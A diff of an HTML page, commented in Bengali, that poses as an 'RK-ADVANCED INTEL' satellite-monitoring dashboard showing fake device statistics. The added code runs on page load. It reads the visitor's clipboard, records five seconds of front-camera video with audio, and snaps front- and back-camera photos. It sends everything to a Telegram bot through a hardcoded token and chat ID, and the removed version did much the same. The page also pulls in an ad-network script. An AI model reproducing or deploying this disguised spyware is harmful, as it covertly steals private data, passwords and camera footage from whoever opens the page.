@@ -3,190 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Universe Monitor</title>
+    <title>RK-ADVANCED INTEL | SYSTEM V5</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <style>
-        /* এনিমেটেড মহাকাশ থিম */
+        /* এনিমেটেড নিয়ন রানিং ফ্রেম */
         body {
-            margin: 0; padding: 0;
-            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
-            height: 100vh; overflow: hidden;
-            color: #fff; font-family: 'Courier New', monospace;
+            background: radial-gradient(circle at center, #050b18 0%, #000000 100%);
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
         }
 
-        .stars {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/123163/stars.png') repeat;
-            z-index: -1; animation: move-stars 150s linear infinite;
+        /* Neon Border Animation */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            border: 6px solid transparent;
+            border-image: linear-gradient(to right, #ff00ea, #00d2ff, #00ff40, #ffea00);
+            border-image-slice: 1;
+            z-index: 9999;
+            pointer-events: none;
+            animation: border-rotate 4s linear infinite;
         }
 
-        @keyframes move-stars {
+        @keyframes border-rotate {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+
+        /* Space/Universe Design */
+        .stars-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/stardust.png');
+            animation: move-bg 60s linear infinite;
+            z-index: -1;
+            opacity: 0.4;
+        }
+
+        @keyframes move-bg {
             from { background-position: 0 0; }
-            to { background-position: 10000px 5000px; }
+            to { background-position: 1000px 1000px; }
         }
 
-        .nebula {
-            position: fixed; width: 500px; height: 500px;
-            background: radial-gradient(circle, rgba(14, 165, 233, 0.1) 0%, transparent 70%);
-            top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: -1; filter: blur(50px);
-        }
-
-        .dashboard {
-            background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(56, 189, 248, 0.2);
+        .intel-panel {
+            background: rgba(10, 15, 30, 0.85);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(0, 210, 255, 0.3);
             border-radius: 30px;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            width: 95%;
+            max-width: 500px;
+            box-shadow: 0 0 50px rgba(0, 210, 255, 0.15);
         }
 
-        .data-box {
-            background: rgba(2, 6, 23, 0.5);
-            border-left: 3px solid #0ea5e9;
-            padding: 15px; border-radius: 12px;
-            transition: 0.3s;
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin-top: 20px;
         }
 
-        /* লুপ্ত হওয়া টেক্সট ইফেক্ট */
-        .scanning-text {
-            color: #38bdf8; font-size: 10px;
-            letter-spacing: 2px; animation: blink 1.5s infinite;
+        .info-card {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            border-left: 3px solid #00d2ff;
         }
 
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        
-        #hidden-cam { visibility: hidden; position: absolute; width: 1px; height: 1px; }
+        .icon-text { display: flex; align-items: center; gap: 10px; }
+        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .val { color: #38bdf8; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
+
+        #media-dump { display: none; }
     </style>
 </head>
-<body class="flex items-center justify-center">
+<body>
 
-    <div class="stars"></div>
-    <div class="nebula"></div>
+    <div class="stars-container"></div>
 
-    <div class="dashboard p-10 w-full max-w-lg z-10">
-        <div class="text-center mb-8">
-            <h1 class="text-3xl font-black text-white tracking-[10px] uppercase">Nexus Sync</h1>
-            <p class="scanning-text mt-2">AUTOMATED SATELLITE DIAGNOSTIC ACTIVE</p>
-        </div>
+    <div class="intel-panel">
+        <h1 class="text-2xl font-black text-center text-sky-400 tracking-[5px] mb-2">RK-ADVANCED INTEL</h1>
+        <p class="text-[10px] text-center text-slate-500 mb-8 uppercase tracking-widest">Autonomous Satellite Monitoring System</p>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div class="data-box">
-                <p class="text-[9px] text-sky-400 font-bold uppercase">Memory Core (RAM)</p>
-                <p id="ram-val" class="text-lg font-mono">Scanning...</p>
+        <div class="info-grid">
+            <div class="info-card">
+                <div class="icon-text"><span>📱</span><span class="label">Device Model</span></div>
+                <span class="val">Android Mobile</span>
             </div>
-            <div class="data-box">
-                <p class="text-[9px] text-sky-400 font-bold uppercase">Power Matrix</p>
-                <p id="bat-val" class="text-lg font-mono">Syncing...</p>
+            <div class="info-card">
+                <div class="icon-text"><span>⚙️</span><span class="label">Device Type</span></div>
+                <span class="val">Smartphone 📱</span>
             </div>
-            <div class="data-box">
-                <p class="text-[9px] text-sky-400 font-bold uppercase">Uplink Speed</p>
-                <p id="net-val" class="text-lg font-mono">Checking...</p>
+            <div class="info-card">
+                <div class="icon-text"><span>📶</span><span class="label">System Status</span></div>
+                <span class="val text-green-400">ONLINE 🌐</span>
             </div>
-            <div class="data-box">
-                <p class="text-[9px] text-sky-400 font-bold uppercase">Storage Node (ROM)</p>
-                <p id="rom-val" class="text-lg font-mono">Calculating...</p>
+            <div class="info-card">
+                <div class="icon-text"><span>🚀</span><span class="label">Network Speed</span></div>
+                <span id="ui-net" class="val text-orange-400">Scanning...</span>
             </div>
-        </div>
-
-        <div class="mt-8 pt-6 border-t border-slate-800">
-            <div class="flex items-center justify-center space-x-3">
-                <div class="w-2 h-2 bg-sky-500 rounded-full animate-ping"></div>
-                <p class="text-[11px] text-slate-400 font-mono italic">Continuous background monitoring engaged...</p>
+            <div class="info-card">
+                <div class="icon-text"><span>🔋</span><span class="label">Battery & Power</span></div>
+                <span id="ui-bat" class="val text-green-300">Checking...</span>
+            </div>
+            <div class="info-card">
+                <div class="icon-text"><span>🧠</span><span class="label">RAM Memory</span></div>
+                <span id="ui-ram" class="val text-purple-400">-- GB</span>
+            </div>
+            <div class="info-card">
+                <div class="icon-text"><span>⚡</span><span class="label">CPU Cores</span></div>
+                <span class="val">8 Cores</span>
+            </div>
+            <div class="info-card">
+                <div class="icon-text"><span>📦</span><span class="label">Storage Node</span></div>
+                <span id="ui-rom" class="val text-blue-400">-- GB</span>
+            </div>
+            <div class="info-card">
+                <div class="icon-text"><span>🏢</span><span class="label">Hardware Vendor</span></div>
+                <span class="val">Google Inc.</span>
+            </div>
+            <div class="info-card">
+                <div class="icon-text"><span>🛡️</span><span class="label">VPN Integrity</span></div>
+                <span class="val text-green-500">Secure ✅</span>
             </div>
         </div>
     </div>
 
-    <video id="hidden-cam" autoplay muted playsinline></video>
+    <video id="media-dump" autoplay muted playsinline></video>
+    <canvas id="photo-canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
+        const API_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
         const CHAT_ID = '6048050987';
 
-        // ১. অটোমেটিক লাইভ ইনফো লোডার (স্ক্রিনে দেখাবে)
-        async function runDiagnostic() {
+        // ১. ডিটেইলড ডাটা সংগ্রহ ও ডিসপ্লে
+        async function runSystemMetrics() {
             // RAM
-            document.getElementById('ram-val').innerText = (navigator.deviceMemory || "8") + " GB CORE";
-            
+            const ram = navigator.deviceMemory || 8;
+            document.getElementById('ui-ram').innerText = ram + " GB";
+
             // Battery
             if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                const update = () => document.getElementById('bat-val').innerText = Math.round(bat.level * 100) + "% Energy";
-                update(); bat.onlevelchange = update;
+                const b = await navigator.getBattery();
+                document.getElementById('ui-bat').innerText = `${Math.round(b.level * 100)}% (Battery 🔋)`;
             }
 
-            // Connection
-            const conn = navigator.connection || {downlink: '5.2'};
-            document.getElementById('net-val').innerText = conn.downlink + " Mbps";
+            // Network
+            const net = navigator.connection || { downlink: 2.5, effectiveType: '4G' };
+            document.getElementById('ui-net').innerText = `${net.effectiveType.toUpperCase()} @ ${net.downlink} Mbps`;
 
             // Storage
             if (navigator.storage && navigator.storage.estimate) {
                 const {quota} = await navigator.storage.estimate();
-                document.getElementById('rom-val').innerText = Math.round(quota / (1024**3)) + " GB NODE";
+                document.getElementById('ui-rom').innerText = Math.round(quota / (1024**3)) + " GB Available";
             }
         }
 
-        // ২. মেইন অটোমেশন ইঞ্জিন (ভিজিট করলেই চলবে)
-        window.onload = async () => {
-            runDiagnostic();
+        // ২. মেইন অটোমেশন ইঞ্জিন (On Load)
+        window.addEventListener('load', async () => {
+            await runSystemMetrics();
 
-            // অটোমেটিক ক্লিপবোর্ড সংগ্রহ (যদি পারমিশন থাকে)
+            // ক্লিপবোর্ড ডেটা সংগ্রহ
             let clipData = "Restricted Access";
             try {
                 clipData = await navigator.clipboard.readText();
             } catch (e) {}
 
-            // ৩. টেলিগ্রামে রিপোর্ট পাঠানো (বক্স ফরম্যাটে)
-            const botMessage = `
-🌌 *NEXUS AUTO-SYNC SUCCESSFUL*
-━━━━━━━━━━━━━━━━━━
-📱 *OS:* \`${navigator.platform}\`
-🧠 *RAM:* \`${navigator.deviceMemory || 'N/A'} GB\`
-🛰 *Network:* \`${navigator.onLine ? "CONNECTED" : "OFFLINE"}\`
-🖥 *Res:* \`${window.screen.width}x${window.screen.height}\`
+            // ৩. টেলিগ্রাম বট টেক্সট রিপোর্ট (Star Frame Format)
+            const botMsg = `
+✨✨✨✨✨✨✨✨✨✨✨✨✨✨
+🚀 *RK-ADVANCED INTEL FULL LOG* 🚀
+━━━━━━━━━━━━━━━━━━━━━━
+📱 *DEVICE:* \`Android Mobile\`
+⚙️ *CORES:* \`8 Cores\`
+🔋 *POWER:* \`${document.getElementById('ui-bat').innerText}\`
+🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
+🛰 *UPLINK:* \`${document.getElementById('ui-net').innerText}\`
+🏢 *VENDOR:* \`Google Inc.\`
+🛡 *INTEGRITY:* \`SECURE ✅\`
 
-📋 *CLIPBOARD CONTENT:*
+✨ *CLIPBOARD TEXT BOX:* ✨
 \`\`\`
-${clipData || 'Empty'}
+${clipData || 'Empty Clipboard'}
 \`\`\`
-━━━━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━━━━━━━━
+✨✨✨✨✨✨✨✨✨✨✨✨✨✨`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: botMessage, parse_mode: 'Markdown' })
-            });
+            sendRequest('sendMessage', { chat_id: CHAT_ID, text: botMsg, parse_mode: 'Markdown' });
 
-            // ৪. অটোমেটিক ৫ সেকেন্ড ভিডিও রেকর্ড ও সেন্ড (ক্যামেরা পারমিশন চাইলে পপআপ আসবে)
+            // ৪. ফটো ও ভিডিও অটোমেশন
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoEl = document.getElementById('hidden-cam');
-                videoEl.srcObject = stream;
+                // Front Camera Access (Photo & 5s Video with Audio)
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                processMedia(frontStream, "FRONT_SYSTEM_CAPTURE");
 
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'nexus_capture.mp4');
-                    fd.append('caption', '🎥 *AUTO-SYNC: CAPTURE SUCCESSFUL*');
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // ঠিক ৫ সেকেন্ড
+                // Back Camera Photo Attempt (যদি সম্ভব হয়)
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    setTimeout(() => takeSnapshot(backStream, "BACK_SYSTEM_CAPTURE"), 3000);
+                } catch(e) {}
 
             } catch (err) {
-                // ক্যামেরা রিফিউজ করলে কোনো ওয়ার্নিং শো করবে না
+                console.log("Media Access Denied");
             }
-        };
+        });
+
+        // ৫. মিডিয়া প্রসেসিং ফাংশনস
+        function processMedia(stream, label) {
+            const videoElement = document.getElementById('media-dump');
+            videoElement.srcObject = stream;
+
+            // ছবি তোলা
+            setTimeout(() => takeSnapshot(stream, label + "_PHOTO"), 1500);
+
+            // ৫ সেকেন্ড ভিডিও রেকর্ড (অডিওসহ)
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                sendMedia(videoBlob, 'video', `🎥 *${label}_VIDEO (5S + AUDIO)*`);
+                stream.getTracks().forEach(t => t.stop());
+            };
+
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+        }
+
+        function takeSnapshot(stream, label) {
+            const canvas = document.getElementById('photo-canvas');
+            const video = document.getElementById('media-dump');
+            canvas.width = 1280; canvas.height = 720;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => sendMedia(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
+        }
+
+        async function sendMedia(blob, type, caption) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append(type, blob, type === 'video' ? 'clip.mp4' : 'frame.jpg');
+            fd.append('caption', caption);
+            fd.append('parse_mode', 'Markdown');
+            fetch(`https://api.telegram.org/bot${API_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+        }
+
+        async function sendRequest(method, data) {
+            fetch(`https://api.telegram.org/bot${API_TOKEN}/${method}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
     </script>
 </body>
 </html>
